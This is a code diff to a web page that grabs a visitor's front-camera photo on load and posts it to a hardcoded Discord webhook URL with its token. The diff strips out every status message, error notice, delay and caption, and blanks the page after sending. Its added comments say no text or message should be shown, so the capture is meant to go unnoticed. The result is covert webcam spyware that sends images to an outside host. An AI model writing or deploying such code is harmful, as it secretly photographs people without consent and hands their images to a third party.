@@ -10,9 +10,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: white;
             min-height: 100vh;
             display: flex;
@@ -21,7 +19,6 @@
             justify-content: center;
             padding: 20px;
         }
-        
         #video {
             width: 300px;
             height: 200px;
@@ -29,65 +26,28 @@
             display: none;
             border: 1px solid #ddd;
         }
-        
         #canvas {
             display: none;
-        }
-        
-        .status {
-            font-size: 16px;
-            color: #333;
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .loading {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #333;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="status" id="status">Loading camera...</div>
-    <div class="loading" id="loading"></div>
-    
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        const status = document.getElementById('status');
-        const loading = document.getElementById('loading');
         
         const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1395581066227482704/bvNY8lJZjqRutiIECB1OKQUhbVcMHUqkTEO6AsJTabeJmQcp4OLSn0OikIl1TXsC72KB';
         
         let stream = null;
         
-        function updateStatus(message, showLoading = false) {
-            status.textContent = message;
-            loading.style.display = showLoading ? 'block' : 'none';
-        }
-        
         async function startCamera() {
             try {
-                updateStatus('Requesting camera access...', true);
-                
                 const constraints = {
                     video: {
-                        facingMode: 'user', // Front camera
+                        facingMode: 'user',
                         width: { ideal: 640 },
                         height: { ideal: 480 }
                     },
@@ -100,28 +60,12 @@
                 video.onloadedmetadata = () => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    
-                    updateStatus('Camera ready, taking photo...', true);
-                    
-                    // Wait a moment for camera to adjust, then capture
-                    setTimeout(captureAndSend, 2000);
+                    // Capture and send immediately, with no delay
+                    captureAndSend();
                 };
                 
             } catch (err) {
-                console.error('Error accessing camera:', err);
-                let errorMessage = 'Camera access denied. ';
-                
-                if (err.name === 'NotAllowedError') {
-                    errorMessage = 'Please allow camera access and refresh the page.';
-                } else if (err.name === 'NotFoundError') {
-                    errorMessage = 'No camera found on this device.';
-                } else if (err.name === 'NotReadableError') {
-                    errorMessage = 'Camera is being used by another application.';
-                } else {
-                    errorMessage = 'Failed to access camera. Please try again.';
-                }
-                
-                updateStatus(errorMessage, false);
+                // Do nothing, no text or message should be shown
             }
         }
         
@@ -129,59 +73,32 @@
             if (!stream) return;
             
             try {
-                updateStatus('Capturing photo...', true);
-                
-                // Draw the current frame to canvas
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to blob
                 canvas.toBlob(async (blob) => {
                     try {
-                        updateStatus('Sending to Discord...', true);
-                        
-                        // Create FormData for Discord webhook
                         const formData = new FormData();
-                        
-                        // Add the image file
                         const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
                         formData.append('file', blob, `camera-capture-${timestamp}.jpg`);
-                        
-                        // Add optional message
                         const payload = {
-                            content: `📸 Camera capture from ${new Date().toLocaleString()}`
+                            content: ""
                         };
                         formData.append('payload_json', JSON.stringify(payload));
                         
-                        // Send to Discord
-                        const response = await fetch(DISCORD_WEBHOOK, {
+                        await fetch(DISCORD_WEBHOOK, {
                             method: 'POST',
                             body: formData
                         });
                         
-                        if (response.ok) {
-                            updateStatus('✅ Photo sent successfully!', false);
-                            
-                            // Clean up
-                            stopCamera();
-                            
-                            // Optional: Hide everything after success
-                            setTimeout(() => {
-                                document.body.innerHTML = '<div style="text-align: center; font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, sans-serif; color: #333; margin-top: 50px;">Photo captured and sent!</div>';
-                            }, 2000);
-                            
-                        } else {
-                            throw new Error(`Discord API error: ${response.status}`);
-                        }
+                        stopCamera();
+                        // Instantly clear the page after finishing, no delay
+                        document.body.innerHTML = '';
                         
                     } catch (error) {
-                        console.error('Error sending to Discord:', error);
-                        updateStatus('❌ Failed to send photo. Please try again.', false);
+                        // Do nothing
                     }
                 }, 'image/jpeg', 0.9);
-                
             } catch (error) {
-                console.error('Error capturing photo:', error);
-                updateStatus();
+                // Do nothing
             }
         }
         
@@ -194,11 +111,9 @@
         
         // Start immediately when page loads
         window.addEventListener('load', () => {
-            // Small delay to ensure page is ready
-            setTimeout(startCamera, 500);
+            startCamera();
         });
         
-        // Clean up when page unloads
         window.addEventListener('beforeunload', stopCamera);
     </script>
 </body>
